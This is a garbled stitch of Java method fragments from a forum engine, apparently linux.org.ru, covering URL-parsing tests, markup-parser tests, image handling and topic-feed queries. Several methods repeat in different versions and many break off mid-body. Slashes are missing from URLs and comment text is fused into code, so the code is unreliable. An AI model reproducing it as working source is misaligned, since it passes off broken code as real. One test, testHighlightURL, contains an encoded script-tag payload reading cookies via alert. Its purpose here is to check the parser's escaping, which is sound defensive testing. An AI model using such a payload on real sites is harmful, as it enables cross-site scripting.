public void test3 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test4 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url4 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test5 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url5 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test6 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void test7 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void test12 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , canon ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , canon ) ) ; } 
public void test15 ( ) throws Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , canon ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , canon ) ) ; } 
public void initTest ( ) throws Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . thenReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . thenReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void testExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false), lorCodeService.parseComment("[user]splinter[/user]", false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false ) ) ; 
public void brTest ( ) { assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false ) ) ; } 
public void boldTest ( ) { assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) ) ; } 
public void quoteTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false ) ) ; } 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) ) ; 
public void paragraphSpacesTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a> <a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] [url]http:linux.org.ru[/url] " , false ) ) ; 
public void urlParamTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void overflow1Test ( ) { assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void spacesTest ( ) { assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false ) ) ; 
public void cut4Test ( ) { assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false ) ) ; 
public void escapeDoubleBrackets ( ) { assertEquals ( " <p>[[doNotTag]]</p> " , lorCodeService . parseComment ( " [[doNotTag]] " , false ) ) ; assertEquals ( " <p>[[/doNotTag]]</p> " , lorCodeService . parseComment ( " [[/doNotTag]] " , false ) ) ; assertEquals ( " <p>[b]</p> " , lorCodeService . parseComment ( " [[b]] " , false ) ) ; assertEquals ( " <p>[/b]</p> " , lorCodeService . parseComment ( " [[/b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[doNotTag]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/doNotTag]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[b]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/b]][/code] " , false ) ) ; assertEquals ( " <p>[[[doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[doNotTag]]] " , false ) ) ; assertEquals ( " <p>[[[/doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[/doNotTag]]] " , false ) ) ; assertEquals ( " <p>[[b]]</p> " , lorCodeService . parseComment ( " [[[b]]] " , false ) ) ; assertEquals ( " <p>[[/b]]</p> " , lorCodeService . parseComment ( " [[[/b]]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[b]][/code][[b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[/b]][/code][[b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[code]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/code]][/code] " , false ) ) ; 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); 
public void testHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false ) ) ; } 
public TcpClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticsearchException ( " no ES here " ) ) ; return TcpClient$ . MODULE$ . fromClient ( mockClient ) ; } 
public Image imageForTopic ( @Nonnull Topic topic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, extension FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , topic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public int saveImage ( int topicId , String extension ) { ImmutableMap < String , ? > dataMap = ImmutableMap . of ( " topic " , topicId , " extension " , extension ) ; return jdbcInsert . executeAndReturnKey ( dataMap ) . intValue ( ) ; } 
public Image mapRow ( ResultSet rs , int i ) throws SQLException { int imageid = rs . getInt ( " id " ) ; return new Image ( imageid , 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) , " images/ " + imageid + " /200px.jpg " ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public void moveTo ( File dir , String name ) throws IOException { File target = Files . createDirectory ( new File ( dir , name ) . toPath ( ) ) . toFile ( ) ; Files . move ( mainFile . toPath ( ) , new File ( target , " original. " + extension ) . toPath ( ) ) ; Files . move ( iconFile . toPath ( ) , new File ( target , Image . IconWidth ( ) + " px. " + extension ) . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , new File ( target , Image . MediumWidth ( ) + " px. " + extension ) . toPath ( ) ) ; Files . move ( medium2xFile . toPath ( ) , new File ( target , Image . Medium2xWidth ( ) + " px. " + extension ) . toPath ( ) ) ; } 
void doResize ( File uploadedFile ) throws IOException , BadImageException { Files . move ( uploadedFile . toPath ( ) , mainFile . toPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = true ; try { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , Image . IconWidth ( ) ) ; 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , UploadedImagePreview scrn , Topic previewMsg ) throws IOException , ScriptErrorException { session . removeAttribute ( " image " ) ; int msgid = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public void moveTo ( File dir , String name ) throws IOException { File target = Files . createDirectory ( new File ( dir , name ) . toPath ( ) ) . toFile ( ) ; Files . move ( mainFile . toPath ( ) , new File ( target , " original. " + extension ) . toPath ( ) ) ; Files . move ( iconFile . toPath ( ) , new File ( target , Image . IconWidth ( ) + " px.jpg " ) . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , new File ( target , Image . MediumWidth ( ) + " px.jpg " ) . toPath ( ) ) ; Files . move ( medium2xFile . toPath ( ) , new File ( target , Image . Medium2xWidth ( ) + " px.jpg " ) . toPath ( ) ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public void moveTo ( File dir , String name ) throws IOException { File target = Files . createDirectory ( new File ( dir , name ) . toPath ( ) ) . toFile ( ) ; Files . move ( mainFile . toPath ( ) , new File ( target , " original. " + extension ) . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , new File ( target , Image . MediumWidth ( ) + " px.jpg " ) . toPath ( ) ) ; Files . move ( medium2xFile . toPath ( ) , new File ( target , Image . Medium2xWidth ( ) + " px.jpg " ) . toPath ( ) ) ; } 
void doResize ( File uploadedFile ) throws IOException , BadImageException { Files . move ( uploadedFile . toPath ( ) , mainFile . toPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = true ; try { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , mediumFile . getAbsolutePath ( ) , Image . MediumWidth ( ) ) ; 
public void initTest ( ) throws Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . thenReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . thenReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; tag= " + tag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + tech ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto ) ; } 
